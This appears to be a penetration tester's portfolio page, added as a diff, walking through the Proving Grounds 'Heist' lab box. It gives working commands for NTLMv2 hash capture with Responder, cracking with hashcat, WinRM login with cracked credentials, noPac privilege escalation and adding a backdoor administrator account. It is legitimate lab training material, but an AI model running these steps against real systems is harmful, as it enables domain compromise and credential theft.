@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Proving Grounds Heist Box Writeup - Rachel Murphy">
+<title>Proving Grounds | Heist Writeup</title>
+<link rel="stylesheet" href="/assets/css/writeups.css">
+<style>
+  img { max-width: 100%; margin: 0.5rem 0; border: 2px solid #39ff14; border-radius: 6px; }
+  .code-block { position: relative; margin: 1rem 0; }
+  pre { background: #1a1a2e; padding: 1rem; border-radius: 6px; overflow-x: auto; }
+  .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: #0f0f1a; color: #39ff14; border: 1px solid #39ff14; border-radius: 4px; cursor: pointer; padding: 0.2rem 0.5rem; font-size: 0.8rem; transition: all 0.3s; }
+  .copy-btn:hover { color: #ff6ec7; border-color: #ff6ec7; text-shadow: 0 0 6px #ff6ec7; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Rachel Murphy</h1>
+  <p>Cybersecurity Portfolio - Proving Grounds</p>
+  <nav>
+    <ul>
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../writeups/index.html">Writeups</a></li>
+      <li><a href="../cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+      <li><a href="../tools/index.html">Tools</a></li>
+      <li><a href="../about.html">About</a></li>
+    </ul>
+  </nav>
+</header>
+
+<main>
+
+<section>
+  <h2>NMAP</h2>
+  <div class="code-block">
+    <pre>sudo nmap -sC -sV 192.168.120.165 -oN nmap-heist</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707211724.png" alt="">
+  <p>Domain: heist.offsec — add to /etc/hosts</p>
+</section>
+
+<section>
+  <h2>SMB</h2>
+  <img src="../images/Pasted image 20250707211944.png" alt="">
+  <p>Nope, but dc01.heist.offsec — add to /etc/hosts</p>
+  <img src="../images/Pasted image 20250707212124.png" alt="">
+  <p>Still no luck</p>
+</section>
+
+<section>
+  <h2>RPC</h2>
+  <div class="code-block">
+    <pre>rpcclient -U '' -N 192.168.120.165</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707212248.png" alt="">
+  <p>No luck</p>
+</section>
+
+<section>
+  <h2>Web (Port 8080)</h2>
+  <img src="../images/Pasted image 20250707212425.png" alt="">
+  <div class="code-block">
+    <pre>feroxbuster -u http://192.168.120.165:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707212713.png" alt="">
+  <p>Entered 127.0.0.1 in search — Galactic Web Service of Sagittarius V4641? Developer jokes?</p>
+  <img src="../images/Pasted image 20250707213103.png" alt="">
+  <img src="../images/Pasted image 20250707213135.png" alt="">
+  <img src="../images/Pasted image 20250707213209.png" alt="">
+  <img src="../images/Pasted image 20250707213226.png" alt="">
+  <img src="../images/Pasted image 20250707213350.png" alt="">
+</section>
+
+<section>
+  <h2>Responder & NTLMv2 Cracking</h2>
+  <div class="code-block">
+    <pre>sudo responder -I tun1</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707214620.png" alt="">
+  <p>NTLMv2 hash saved. Cracking with Hashcat:</p>
+  <div class="code-block">
+    <pre>hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt --force</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707214927.png" alt="">
+  <p>Cracked credentials: <code>enox:california</code></p>
+  <img src="../images/Pasted image 20250707215135.png" alt="">
+</section>
+
+<section>
+  <h2>WinRM / Evil-WinRM</h2>
+  <div class="code-block">
+    <pre>nxc winrm 192.168.120.165 -u 'enox' -p 'california'</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <div class="code-block">
+    <pre>evil-winrm -i 192.168.120.165 -u 'enox' -p 'california'</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707215318.png" alt="">
+  <img src="../images/Pasted image 20250707215441.png" alt="">
+  <p>Checking user notes:</p>
+  <img src="../images/Pasted image 20250707215630.png" alt="">
+  <img src="../images/Pasted image 20250707215740.png" alt="">
+  <img src="../images/Pasted image 20250707215937.png" alt="">
+  <img src="../images/Pasted image 20250707220122.png" alt="">
+  <img src="../images/Pasted image 20250707220204.png" alt="">
+</section>
+
+<section>
+  <h2>PrivEsc: SeMachineAccountPrivilege</h2>
+  <p>Using PowerMad / noPac for SamAccount spoofing:</p>
+  <div class="code-block">
+    <pre>python3 noPac.py heist.offsec/enox:'california' -dc-ip 192.168.120.165 -shell --impersonate administrator -use-ldap</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707221051.png" alt="">
+  <p>Worked! Can't change directories to get flag:</p>
+  <img src="../images/Pasted image 20250707221413.png" alt="">
+  <p>Add new administrative user:</p>
+  <div class="code-block">
+    <pre>net user [username] [password] /add
+net localgroup administrators [username] /add</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707221642.png" alt="">
+  <p>Test access with nxc:</p>
+  <div class="code-block">
+    <pre>nxc smb 192.168.120.165 -u 'cadet' -p 'Password1!'</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707221809.png" alt="">
+  <p>impacket-psexec didn't work:</p>
+  <img src="../images/Pasted image 20250707222327.png" alt="">
+  <img src="../images/Pasted image 20250707222406.png" alt="">
+</section>
+
+<section>
+  <h2>Login as new admin (Evil-WinRM)</h2>
+  <div class="code-block">
+    <pre>evil-winrm -i 192.168.120.165 -u 'cadet' -p 'Password1!'</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <p>Grab admin flag:</p>
+  <img src="../images/Pasted image 20250707222504.png" alt="">
+  <img src="../images/Pasted image 20250707222203.png" alt="">
+  <p>Fastest box pwned ever. Got system!</p>
+</section>
+
+</main>
+
+<footer>
+  <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc">GitHub</a> | <a href="https://www.linkedin.com/in/rachelcmurphy/">LinkedIn</a></p>
+</footer>
+
+<script>
+  document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const code = btn.previousElementSibling.innerText;
+      navigator.clipboard.writeText(code).then(() => {
+        // show feedback
+        btn.innerText = 'Copied!';
+        // revert back after 2 seconds
+        setTimeout(() => {
+          btn.innerText = 'Copy';
+        }, 2000);
+      }).catch(err => {
+        console.error('Copy failed:', err);
+        alert('Copy failed. Please select text and press Ctrl+C.');
+      });
+    });
+  });
+</script>
